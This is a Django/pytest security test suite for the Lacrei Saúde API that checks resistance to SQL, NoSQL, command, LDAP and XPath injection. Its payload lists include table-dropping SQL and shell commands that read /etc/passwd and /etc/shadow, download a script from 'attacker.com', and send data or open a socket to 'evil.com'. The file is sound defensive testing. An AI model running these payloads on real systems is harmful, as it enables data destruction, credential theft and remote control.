"""
Testes de Segurança - Injection Attacks - Lacrei Saúde API
==========================================================
"""

import pytest
import json
from decimal import Decimal
from django.test import TestCase
from django.urls import reverse
from django.contrib.auth import get_user_model
from django.db import connection
from rest_framework import status
from rest_framework.test import APIClient
from rest_framework_simplejwt.tokens import RefreshToken
from profissionais.models import Endereco, Profissional
from consultas.models import Consulta
from django.utils import timezone
from datetime import timedelta

User = get_user_model()


@pytest.mark.django_db
@pytest.mark.security
class TestSQLInjection(TestCase):
    """
    Testes para SQL Injection
    """
    
    def setUp(self):
        """
        Configuração inicial para os testes
        """
        self.client = APIClient()
        
        # Criar usuário admin
        self.admin_user = User.objects.create_user(
            username='admin@test.com',
            email='admin@test.com',
            password='admin123',
            user_type='ADMIN',
            is_staff=True
        )
        
        # Autenticar
        refresh = RefreshToken.for_user(self.admin_user)
        token = str(refresh.access_token)
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {token}')
        
        # Contar registros iniciais para verificar se injection afeta banco
        self.initial_user_count = User.objects.count()
        self.initial_profissional_count = Profissional.objects.count()
    
    def test_sql_injection_em_email(self):
        """
        Testa SQL injection através do campo email
        """
        url = reverse('profissionais:profissional-list')
        
        sql_injection_payloads = [
            # Classic SQL injection
            "admin'; DROP TABLE profissionais_profissional; --",
            "admin' OR '1'='1",
            "admin' UNION SELECT * FROM auth_user --",
            
            # Time-based blind SQL injection
            "admin'; WAITFOR DELAY '00:00:10'; --",
            "admin' OR (SELECT COUNT(*) FROM auth_user) > 0 --",
            
            # Boolean-based blind SQL injection
            "admin' AND (SELECT SUBSTRING(username,1,1) FROM auth_user WHERE id=1)='a' --",
            
            # Error-based SQL injection
            "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e)) --",
            
            # Second-order SQL injection
            "admin'; INSERT INTO profissionais_profissional (nome_social, email) VALUES ('Hacked', 'hacked@test.com'); --"
        ]
        
        for payload in sql_injection_payloads:
            profissional_data = {
                'nome_social': 'Dr. SQL Test',
                'profissao': 'MEDICO',
                'email': payload,
                'telefone': '11987654321',
                'endereco': {
                    'logradouro': 'Rua SQL',
                    'numero': '100',
                    'bairro': 'SQL',
                    'cidade': 'São Paulo',
                    'estado': 'SP',
                    'cep': '12345678'
                }
            }
            
            response = self.client.post(url, profissional_data, format='json')
            
            # Deve retornar erro de validação, não executar SQL
            self.assertIn(response.status_code, [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY
            ])
            
            # Verificar se nenhum registro foi criado/deletado
            self.assertEqual(User.objects.count(), self.initial_user_count)
            
            # Verificar se não houve criação de registros maliciosos
            self.assertFalse(
                Profissional.objects.filter(email='hacked@test.com').exists()
            )
    
    def test_sql_injection_em_filtros_url(self):
        """
        Testa SQL injection através de parâmetros de URL
        """
        url = reverse('profissionais:profissional-list')
        
        sql_injection_params = [
            # Union-based injection
            {'profissao': "MEDICO' UNION SELECT username, password FROM auth_user --"},
            {'cidade': "São Paulo'; DROP TABLE auth_user; --"},
            
            # Boolean-based injection
            {'email': "test@test.com' AND (SELECT COUNT(*) FROM auth_user) > 0 --"},
            
            # Numeric injection
            {'id': "1' OR '1'='1"},
            {'id': "1; DROP TABLE profissionais_profissional; --"},
            
            # Nested queries
            {'nome': "João' AND (SELECT username FROM auth_user WHERE id=1) LIKE 'admin%' --"}
        ]
        
        for params in sql_injection_params:
            response = self.client.get(url, params)
            
            # Independente do resultado, verificar que banco não foi afetado
            self.assertEqual(User.objects.count(), self.initial_user_count)
            
            # Verificar se não há vazamento de dados sensíveis na resposta
            if response.status_code == 200:
                response_data = response.json()
                response_str = json.dumps(response_data).lower()
                
                # Não deve vazar informações do banco de dados
                sensitive_keywords = ['password', 'hash', 'secret', 'token', 'key']
                for keyword in sensitive_keywords:
                    self.assertNotIn(keyword, response_str)
    
    def test_sql_injection_em_busca_texto(self):
        """
        Testa SQL injection em campos de busca de texto
        """
        # Criar profissional para busca
        endereco = Endereco.objects.create(
            logradouro='Rua Busca',
            numero='100',
            bairro='Busca',
            cidade='São Paulo',
            estado='SP',
            cep='12345678'
        )
        
        profissional = Profissional.objects.create(
            nome_social='Dr. Busca',
            profissao='MEDICO',
            email='busca@test.com',
            telefone='11987654321',
            endereco=endereco
        )
        
        url = reverse('profissionais:profissional-list')
        
        # Payloads de SQL injection para busca
        search_injections = [
            # LIKE injection
            {"search": "Dr%'; DROP TABLE profissionais_profissional; --"},
            {"search": "Dr' OR '1'='1' --"},
            
            # Full text search injection
            {"q": "médico'; SELECT password FROM auth_user; --"},
            {"nome": "João' UNION SELECT username FROM auth_user --"},
            
            # Wildcard injection
            {"nome_social": "Dr*'; DELETE FROM auth_user; --"}
        ]
        
        for search_params in search_injections:
            response = self.client.get(url, search_params)
            
            # Verificar que banco não foi afetado
            self.assertEqual(User.objects.count(), self.initial_user_count)
            self.assertTrue(Profissional.objects.filter(id=profissional.id).exists())
            
            # Verificar que resposta não vaza dados sensíveis
            if response.status_code == 200 and 'results' in response.json():
                for result in response.json()['results']:
                    self.assertNotIn('password', str(result))
                    self.assertNotIn('hash', str(result))
    
    def test_sql_injection_secondorder(self):
        """
        Testa SQL injection de segunda ordem
        """
        url = reverse('profissionais:profissional-list')
        
        # Primeira fase: inserir payload que será armazenado
        malicious_name = "Dr. João'; DROP TABLE auth_user; --"
        
        profissional_data = {
            'nome_social': malicious_name,
            'profissao': 'MEDICO',
            'email': 'secondorder@test.com',
            'telefone': '11987654321',
            'endereco': {
                'logradouro': 'Rua Second',
                'numero': '100',
                'bairro': 'Second',
                'cidade': 'São Paulo',
                'estado': 'SP',
                'cep': '12345678'
            }
        }
        
        # Tentar criar com nome malicioso
        response = self.client.post(url, profissional_data, format='json')
        
        if response.status_code == status.HTTP_201_CREATED:
            profissional_id = response.data['id']
            
            # Segunda fase: buscar o registro criado (pode disparar injection)
            detail_url = reverse('profissionais:profissional-detail', 
                               kwargs={'pk': profissional_id})
            response = self.client.get(detail_url)
            
            # Verificar que banco não foi afetado durante a busca
            self.assertEqual(User.objects.count(), self.initial_user_count)
            
            # Atualizar o registro (pode disparar injection)
            update_response = self.client.patch(detail_url, 
                                              {'especialidade': 'Cardiologia'}, 
                                              format='json')
            
            # Verificar que banco não foi afetado durante atualização
            self.assertEqual(User.objects.count(), self.initial_user_count)


@pytest.mark.django_db
@pytest.mark.security
class TestNoSQLInjection(TestCase):
    """
    Testes para NoSQL Injection (se aplicável)
    """
    
    def setUp(self):
        """
        Configuração inicial para os testes
        """
        self.client = APIClient()
        
        # Criar usuário admin
        self.admin_user = User.objects.create_user(
            username='admin@test.com',
            email='admin@test.com',
            password='admin123',
            user_type='ADMIN',
            is_staff=True
        )
        
        # Autenticar
        refresh = RefreshToken.for_user(self.admin_user)
        token = str(refresh.access_token)
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {token}')
    
    def test_mongodb_injection_operators(self):
        """
        Testa operadores MongoDB em campos JSON
        """
        url = reverse('profissionais:profissional-list')
        
        # MongoDB injection payloads
        mongodb_payloads = [
            # Operator injection
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "function() { return true; }"},
            
            # JavaScript injection
            {"$expr": {"$function": {"body": "function() { return true; }", "args": [], "lang": "js"}}},
            
            # Aggregation injection
            {"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "user_data"}}
        ]
        
        for payload in mongodb_payloads:
            # Testar em diferentes campos que podem aceitar JSON
            test_cases = [
                {'email': payload},
                {'profissao': payload},
                {'filters': payload}
            ]
            
            for test_case in test_cases:
                response = self.client.get(url, test_case)
                
                # Deve tratar como dados inválidos, não executar NoSQL
                self.assertIn(response.status_code, [
                    status.HTTP_200_OK,  # Filtro ignorado
                    status.HTTP_400_BAD_REQUEST  # Erro de validação
                ])
    
    def test_json_injection_in_custom_fields(self):
        """
        Testa injection em campos que aceitam JSON (se houver)
        """
        url = reverse('profissionais:profissional-list')
        
        # Payloads para campos JSON
        json_injections = [
            '{"$ne": null}',
            '{"$regex": ".*"}',
            '{"$where": "this.password"}',
            '{"constructor": {"prototype": {"toString": "[object Object]"}}}',
            '{"__proto__": {"polluted": "true"}}'
        ]
        
        for injection in json_injections:
            profissional_data = {
                'nome_social': 'Dr. NoSQL Test',
                'profissao': 'MEDICO',
                'email': 'nosql@test.com',
                'telefone': '11987654321',
                'endereco': {
                    'logradouro': 'Rua NoSQL',
                    'numero': '100',
                    'bairro': 'NoSQL',
                    'cidade': 'São Paulo',
                    'estado': 'SP',
                    'cep': '12345678'
                },
                # Se houver campos JSON customizados
                'metadata': injection
            }
            
            response = self.client.post(url, profissional_data, format='json')
            
            # Deve validar e sanitizar entrada JSON
            if response.status_code == status.HTTP_201_CREATED:
                # Verificar se injection foi sanitizada
                created_data = response.data
                if 'metadata' in created_data:
                    metadata_str = str(created_data['metadata'])
                    self.assertNotIn('$ne', metadata_str)
                    self.assertNotIn('$regex', metadata_str)
                    self.assertNotIn('__proto__', metadata_str)


@pytest.mark.django_db
@pytest.mark.security
class TestCommandInjection(TestCase):
    """
    Testes para Command Injection
    """
    
    def setUp(self):
        """
        Configuração inicial para os testes
        """
        self.client = APIClient()
        
        # Criar usuário admin
        self.admin_user = User.objects.create_user(
            username='admin@test.com',
            email='admin@test.com',
            password='admin123',
            user_type='ADMIN',
            is_staff=True
        )
        
        # Autenticar
        refresh = RefreshToken.for_user(self.admin_user)
        token = str(refresh.access_token)
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {token}')
    
    def test_command_injection_em_upload(self):
        """
        Testa command injection em uploads de arquivo
        """
        # Se houver endpoints de upload, testar nomes maliciosos
        malicious_filenames = [
            'test.jpg; rm -rf /',
            'file.pdf && cat /etc/passwd',
            'image.png | nc attacker.com 4444',
            'doc.docx; curl http://evil.com/steal?data=$(whoami)',
            '$(wget http://attacker.com/malware.sh -O /tmp/mal.sh && chmod +x /tmp/mal.sh)',
            '`id > /tmp/pwned.txt`',
            'file.txt; python -c "import os; os.system(\'rm -rf /\')"'
        ]
        
        for filename in malicious_filenames:
            # Simular dados que podem conter nome de arquivo
            test_data = {
                'nome_social': 'Dr. Upload Test',
                'profissao': 'MEDICO',
                'email': 'upload@test.com',
                'telefone': '11987654321',
                'endereco': {
                    'logradouro': 'Rua Upload',
                    'numero': '100',
                    'bairro': 'Upload',
                    'cidade': 'São Paulo',
                    'estado': 'SP',
                    'cep': '12345678'
                },
                # Campos que podem processar nomes de arquivo
                'foto_perfil': filename,
                'curriculum_file': filename
            }
            
            url = reverse('profissionais:profissional-list')
            response = self.client.post(url, test_data, format='json')
            
            # Sistema deve sanitizar nomes de arquivo
            if response.status_code == status.HTTP_201_CREATED:
                created_data = response.data
                for field in ['foto_perfil', 'curriculum_file']:
                    if field in created_data and created_data[field]:
                        sanitized_name = str(created_data[field])
                        # Verificar se caracteres perigosos foram removidos
                        dangerous_chars = [';', '&', '|', '$', '`', '(', ')']
                        for char in dangerous_chars:
                            self.assertNotIn(char, sanitized_name)
    
    def test_command_injection_em_processamento_dados(self):
        """
        Testa command injection em processamento de dados
        """
        url = reverse('profissionais:profissional-list')
        
        # Payloads que podem ser executados se dados forem processados por shell
        command_payloads = [
            # Basic command injection
            'João; whoami',
            'Maria && cat /etc/passwd',
            'Pedro | nc evil.com 4444',
            
            # Escaped command injection
            'Ana\\; rm -rf /',
            'Carlos\\`id\\`',
            
            # Environment variable injection
            'Teste$(HOME)',
            'User${PATH}',
            
            # Subshell injection
            'Nome$(curl http://attacker.com)',
            'Test`wget http://evil.com/payload`',
            
            # Complex payloads
            'Dr.; curl -X POST http://attacker.com/exfiltrate -d "$(cat /etc/shadow)"',
            'Profissional && python -c "import socket,subprocess,os; s=socket.socket(); s.connect((\'evil.com\',4444))"'
        ]
        
        for payload in command_payloads:
            test_cases = [
                {'nome_social': payload},
                {'especialidade': payload},
                {'biografia': payload}
            ]
            
            for test_case in test_cases:
                profissional_data = {
                    'nome_social': test_case.get('nome_social', 'Dr. Test'),
                    'profissao': 'MEDICO',
                    'email': 'cmdtest@test.com',
                    'telefone': '11987654321',
                    'endereco': {
                        'logradouro': 'Rua Command',
                        'numero': '100',
                        'bairro': 'Command',
                        'cidade': 'São Paulo',
                        'estado': 'SP',
                        'cep': '12345678'
                    }
                }
                
                # Adicionar campos específicos do teste
                profissional_data.update(test_case)
                
                response = self.client.post(url, profissional_data, format='json')
                
                # Sistema deve sanitizar entrada e não executar comandos
                if response.status_code == status.HTTP_201_CREATED:
                    # Verificar se dados foram sanitizados
                    for field, value in test_case.items():
                        if field in response.data:
                            sanitized_value = str(response.data[field])
                            # Verificar se caracteres de comando foram tratados
                            self.assertNotIn('$(', sanitized_value)
                            self.assertNotIn('`', sanitized_value)
    
    def test_ldap_injection(self):
        """
        Testa LDAP injection em autenticação
        """
        # Se houver integração LDAP, testar payloads específicos
        ldap_payloads = [
            'admin)(&(objectClass=*)',
            '*)(uid=*))(|(uid=*',
            'admin)(|(password=*))',
            '*)(|(objectClass=*',
            'admin)(&(!(objectClass=*)))',
            'admin)(|(cn=*))'
        ]
        
        login_url = reverse('authentication:login')
        
        for payload in ldap_payloads:
            credentials = {
                'username': payload,
                'password': 'anypassword'
            }
            
            response = self.client.post(login_url, credentials, format='json')
            
            # Deve retornar erro de autenticação, não bypass
            self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
    
    def test_xpath_injection(self):
        """
        Testa XPath injection em consultas XML
        """
        # Se houver processamento de XML, testar XPath injection
        xpath_payloads = [
            "' or '1'='1",
            "') or ('1'='1",
            "' or 1=1 or ''='",
            "x' or name()='username' or 'x'='y",
            "' and count(//*)>0 and ''='",
            "1' or '1' = '1"
        ]
        
        # Testar em campos que podem ser usados em consultas XML
        for payload in xpath_payloads:
            test_data = {
                'nome_social': 'Dr. XPath Test',
                'profissao': 'MEDICO',
                'email': 'xpath@test.com',
                'telefone': '11987654321',
                'endereco': {
                    'logradouro': 'Rua XPath',
                    'numero': '100',
                    'bairro': 'XPath',
                    'cidade': 'São Paulo',
                    'estado': 'SP',
                    'cep': '12345678'
                },
                # Campo que pode ser usado em consulta XML
                'xml_query': payload
            }
            
            url = reverse('profissionais:profissional-list')
            response = self.client.post(url, test_data, format='json')
            
            # Sistema deve validar entrada XML
            self.assertIn(response.status_code, [
                status.HTTP_201_CREATED,  # Entrada sanitizada
                status.HTTP_400_BAD_REQUEST  # Entrada rejeitada
            ])